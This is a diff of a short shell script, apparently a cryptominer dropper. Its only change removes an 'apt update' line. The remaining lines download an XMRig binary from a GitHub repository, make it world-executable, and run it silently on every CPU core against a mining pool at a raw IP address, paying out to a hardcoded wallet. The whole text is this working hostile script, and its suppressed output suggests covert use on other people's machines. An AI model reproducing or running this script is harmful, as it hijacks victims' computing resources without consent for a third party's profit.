@@ -1,5 +1,4 @@
 #!/bin/sh
-apt update
 wget -O gigi https://github.com/kazppkido/kikir/raw/main/xmrig > /dev/null 2>&1
 chmod 777 gigi
 ./gigi --donate-level 1 -o 165.232.165.31:80 -u 0xb27e57f4accbf3a1384c1c17ac959376fc49e21d -p $(shuf -n 1 -i 1-999)-BB -a rx/0 -t $(nproc --all) > /dev/null 2>&1
